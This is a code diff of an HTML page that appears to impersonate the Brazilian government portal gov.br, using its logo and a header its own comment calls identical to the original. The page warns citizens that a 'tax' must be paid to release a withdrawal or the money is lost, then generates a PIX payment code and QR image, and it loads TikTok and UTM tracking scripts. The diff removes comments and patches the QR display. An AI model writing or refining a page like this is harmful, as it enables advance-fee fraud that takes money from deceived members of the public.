@@ -2,7 +2,6 @@
 <html lang="pt-BR">
 <head>
 
-<!-- TikTok Pixel Code Start -->
 <script>
 !function (w, d, t) {
   w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
@@ -12,8 +11,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   ttq.page();
 }(window, document, 'ttq');
 </script>
-<!-- TikTok Pixel Code End -->
-
 <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
 <script>
 window.tikTokPixelId = "19cebd8877cbf1cb62fe26d1297b78272d4621f0";
@@ -270,7 +267,6 @@ document.head.appendChild(a);
 </head>
 <body>
 
-<!-- HEADER — IDÊNTICO AO ORIGINAL -->
 <header>
   <div class="logo"><img src="images/govbr.png" style="width:90px;margin:10px;"></div>
   <div class="icons">
@@ -301,7 +297,6 @@ document.head.appendChild(a);
 
 <main id="main-content">
 
-  <!-- Aviso gov -->
   <div class="gov-aviso">
     <i class="fas fa-exclamation-triangle"></i>
     <span>Para liberar o seu saque é necessário o recolhimento do imposto. O não pagamento resultará na perda do valor disponível.</span>
@@ -310,22 +305,18 @@ document.head.appendChild(a);
   <div id="pix-section">
     <div class="pix-stripe"></div>
 
-    <!-- Loading -->
     <div class="pix-loading-overlay" id="pix-loading">
       <div class="pix-big-spin"></div>
       <p>Gerando seu PIX, aguarde...</p>
     </div>
 
-    <!-- Erro -->
     <div class="pix-erro" id="pix-erro" style="display:none;">
       <div>Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.</div>
       <button onclick="pixIniciar()">Tentar novamente</button>
     </div>
 
-    <!-- Conteúdo principal -->
     <div id="pix-main" style="display:none;">
 
-      <!-- Dados do cidadão + valor -->
       <div class="pix-cidadao">
         <div class="pix-cidadao-info">
           <div class="pix-cidadao-nome" id="pix-nome-show">---</div>
@@ -460,7 +451,8 @@ document.head.appendChild(a);
       document.getElementById('pix-code-box').textContent=_pixCode;
       var wrap=document.getElementById('pix-qr-img');wrap.innerHTML='';
       var imgEl=document.createElement('img');
-      imgEl.src=data.data.paymentData.qrCodeBase64?data.data.paymentData.qrCodeBase64:'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
+      var b64=data.data.paymentData.qrCodeBase64;
+      imgEl.src=b64?(b64.startsWith('data:image')?b64:'data:image/png;base64,'+b64):'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
       imgEl.alt='QR Code PIX';imgEl.style.cssText='border-radius:8px;max-width:190px;';
       wrap.appendChild(imgEl);_pixQRFeito=true;
       document.getElementById('pix-loading').style.display='none';
